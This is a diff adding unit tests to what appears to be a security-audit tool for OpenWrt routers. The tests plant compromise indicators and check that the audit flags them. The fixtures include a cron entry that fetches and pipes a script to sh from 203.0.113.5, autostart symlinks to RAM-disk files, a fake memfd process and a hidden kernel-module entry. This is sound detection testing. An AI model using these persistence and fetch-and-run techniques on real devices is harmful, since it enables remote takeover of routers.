@@ -685,5 +685,148 @@ EOF
                     f"cp -a /tmp/release.rom {ROM_DIR}/etc/openwrt_release")
 
 
+class TestReviewFindings(AuditCase):
+    """Round 3: what an independent review found in the audit."""
+
+    SETUP = MAKE_UPPER + rf"""
+{SET_ROOT_PW}
+P={PROC_DIR}
+mkdir -p $P/300 $P/301 $P/302 /tmp/run /tmp/openwrt-mcp.evil
+# F1: a process that runs the image's own busybox (the server's trusted tools do)
+ln -s {ROM_DIR}/bin/busybox $P/300/exe
+# F8: a program that exists only in memory
+ln -s '/memfd:kworker (deleted)' $P/301/exe
+# an ordinary upgraded service, for contrast
+ln -s '/usr/sbin/dnsmasq (deleted)' $P/302/exe
+for p in 300 301 302; do echo "proc$p" > $P/$p/comm; printf 'cmd%s\000' $p > $P/$p/cmdline; : > $P/$p/environ; done
+# F3: a program in a directory that only looks like the server's
+printf '#!/bin/sh\nid\n' > /tmp/openwrt-mcp.evil/run.sh && chmod 755 /tmp/openwrt-mcp.evil/run.sh
+# F2: autostart files that are links to the RAM disk
+echo '*/5 * * * * wget -qO- http://203.0.113.5/x | sh' > /tmp/.c
+rm -f /etc/crontabs/root && ln -s /tmp/.c /etc/crontabs/root
+printf '/tmp/.cache/agent &\nexit 0\n' > /tmp/.rc
+rm -f /etc/rc.local && ln -s /tmp/.rc /etc/rc.local
+# F8: a kernel module list nobody ships
+echo hideme > /etc/modules.d/99-hideme
+"""
+
+    def test_process_running_the_images_busybox_is_from_the_image(self):
+        text, found = self.audit(FULL, categories=["integrity"])
+        self.assertNotIn("pid 300", text)
+        self.assertNotIn("integrity.process_not_from_image", found)
+
+    def test_the_servers_own_processes_are_left_out(self):
+        env = dict(FULL)
+        pid = self.session(env).call_tool("exec", {"command": "echo ${MCP_CALL_TAG%%.*}"})[0].split()[0]
+        self.sh(f"""P={PROC_DIR}; mkdir -p $P/310 $P/311; printf '#!/bin/sh\\nid\\n' > /tmp/run/tool; chmod 755 /tmp/run/tool
+            for p in 310 311; do ln -sf /tmp/run/tool $P/$p/exe; echo t$p > $P/$p/comm; : > $P/$p/cmdline; done
+            printf 'A=1\\000MCP_CALL_TAG={pid}.7.\\000' > $P/310/environ
+            printf 'A=1\\000MCP_CALL_TAG=1.7.\\000' > $P/311/environ""")
+        try:
+            text, found = self.audit(env, categories=["integrity"])
+            self.assertFinding(found, "integrity.process_tmp_binary", "MEDIUM", "pid 311 ")
+            self.assertNotIn("pid 310", text)
+        finally:
+            self.sh(f"rm -rf {PROC_DIR}/310 {PROC_DIR}/311 /tmp/run/tool")
+
+    def test_memfd_is_fileless_execution_not_an_upgrade(self):
+        _, found = self.audit(FULL, categories=["integrity"])
+        self.assertFinding(found, "integrity.process_memfd", "HIGH", "pid 301 (proc301): /memfd:kworker (deleted)")
+        self.assertFinding(found, "integrity.process_deleted_binary", "MEDIUM", "pid 302 ")
+        self.assertNotIn("pid 301", found["integrity.process_deleted_binary"][1])
+
+    def test_program_in_a_lookalike_temp_dir_is_found(self):
+        _, found = self.audit(FULL, categories=["integrity"])
+        self.assertFinding(found, "integrity.tmp_executable", "LOW", "/tmp/openwrt-mcp.evil/run.sh: script")
+
+    def test_autostart_through_links(self):
+        text, found = self.audit(FULL, categories=["persistence"])
+        self.assertFinding(found, "persistence.user_autostart", "MEDIUM",
+                           "/etc/crontabs/root line 1: */5 * * * * wget -qO- http://203.0.113.5/x | sh",
+                           "/etc/rc.local line 1: /tmp/.cache/agent &")
+        self.assertFinding(found, "persistence.autostart_link", "MEDIUM", "/etc/crontabs/root -> /tmp/.c",
+                           "/etc/rc.local -> /tmp/.rc")
+        self.assertNotIn("persistence.user_autostart", text.split("== Checked, nothing found")[1])
+
+    def test_new_kernel_module_list_is_reported(self):
+        _, found = self.audit(FULL, categories=["persistence"])
+        self.assertFinding(found, "persistence.module_autoload", "MEDIUM", "/etc/modules.d/99-hideme", "hideme")
+
+    def test_mounts_over_system_paths(self):
+        self.sh(f"""printf '%s\\n' 'overlay / overlay rw 0 0' '/dev/ubi0_2 /lib/firmware squashfs ro,relatime 0 0' \
+            'tmpfs /usr/bin/ip tmpfs rw 0 0' > {PROC_DIR}/mounts""")
+        try:
+            _, found = self.audit(FULL, categories=["integrity"])
+            self.assertFinding(found, "integrity.mount_over_system_path", "MEDIUM", "tmpfs mounted on /usr/bin/ip")
+            self.assertNotIn("/lib/firmware", found["integrity.mount_over_system_path"][1])
+            self.assertFinding(found, "integrity.image_mount", "INFO", "/dev/ubi0_2 mounted on /lib/firmware (squashfs")
+        finally:
+            self.sh(f"rm -f {PROC_DIR}/mounts")
+
+    def test_lan_zone_on_the_default_route_is_not_wan(self):
+        # F6a: access point or client mode: the default route leaves through the LAN bridge
+        self.sh(r"""z=$(uci show firewall | sed -n "s/^\(firewall\.@zone\[[0-9]*\]\)\.name='lan'$/\1/p")
+            uci add_list "$z.device=eth0"; uci commit firewall
+            (uhttpd -f -p 0.0.0.0:18095 -h /www >/dev/null 2>&1 &) ; sleep 1""")
+        text, found = self.audit(ROM, categories=["exposure"])
+        self.assertNotIn("exposure.wan_input_accept", found)
+        self.assertNotIn("zone 'lan'", text.split("== Checked")[0])
+        self.assertIn("default route via the LAN zone (access point or client mode)", text.split("== Could not check")[1])
+
+    def test_without_a_wan_zone_exposure_is_not_checked(self):
+        # F6b
+        self.sh(r"""cp /etc/config/firewall /tmp/firewall.bak
+            z=$(uci show firewall | sed -n "s/^\(firewall\.@zone\[[0-9]*\]\)\.name='wan'$/\1/p")
+            uci delete "$z"; uci commit firewall""")
+        try:
+            text, found = self.audit(ROM, categories=["exposure"])
+            self.assertFalse([f for f in found if f.startswith("exposure.wan") or f == "exposure.port_forward"])
+            self.assertRegex(text.split("== Could not check")[1],
+                             r"exposure\.wan_input_accept, exposure\.wan_open_port, exposure\.port_forward: no zone .*WAN")
+            for check in ("exposure.wan_input_accept", "exposure.wan_open_port", "exposure.port_forward"):
+                self.assertNotIn(check, text.split("== Checked, nothing found")[1].split("==")[0])
+        finally:
+            self.sh("cp /tmp/firewall.bak /etc/config/firewall")
+
+    def test_cut_scans_are_said(self):
+        # F7: a persistence location with more entries than are examined, and an overlay
+        # with more entries than are scanned
+        self.sh(f"mkdir -p /etc/cron.d {UPPER_DIR}/srv/flood && (cd /etc/cron.d && seq 1 5200 | sed 's/^/f/' | xargs touch) && "
+                f"(cd {UPPER_DIR}/srv/flood && seq 1 20100 | xargs touch)")
+        try:
+            text, found = self.audit(FULL, categories=["integrity", "persistence"])
+            tail = text.split("== Could not check")[1]
+            self.assertRegex(tail, r"persistence: more than \d+ entries in cron")
+            self.assertRegex(tail, r"integrity: the overlay holds more than 20000 entries")
+            self.assertIn("persistence.module_autoload", found)  # the other locations were still scanned
+            self.assertIn("more than 20000 overlay entries", self.tool_ok("overlay_diff", FULL))
+        finally:
+            self.sh(f"rm -rf /etc/cron.d {UPPER_DIR}/srv")
+
+    def test_without_overlay_every_overlay_check_is_listed_as_skipped(self):
+        # F10
+        text, _ = self.audit(ROM, categories=["integrity"])
+        tail = text.split("== Could not check")[1]
+        for check in ("integrity.image_file_replaced", "integrity.image_data_changed", "integrity.first_boot_changes",
+                      "integrity.package_upgrades", "integrity.setuid_added"):
+            self.assertIn(check, tail)
+
+
+class TestNativeProcesses(AuditCase):
+    """Real /proc/PID/exe links: only where the container runs without emulation (the
+    armsr image on an ARM host). Then the server's trusted tools run from the image
+    copy, and nothing of that may be reported."""
+
+    def test_trusted_tools_are_not_foreign_processes(self):
+        if "qemu" in self.sh("readlink /proc/1/exe"):
+            self.skipTest("emulated container: /proc/PID/exe points at the emulator")
+        self.sh("(sleep 300 &)")
+        text, found = self.audit(ROM, categories=["integrity"])
+        self.assertIn(f"trusted tools: yes ({ROM_DIR}/bin/busybox", text)
+        for check in ("integrity.process_not_from_image", "integrity.process_tmp_binary", "integrity.process_deleted_binary"):
+            self.assertNotIn(check, found)
+        self.assertNotIn("processes point at a program path that does not exist", text)
+
+
 if __name__ == "__main__":
     unittest.main()
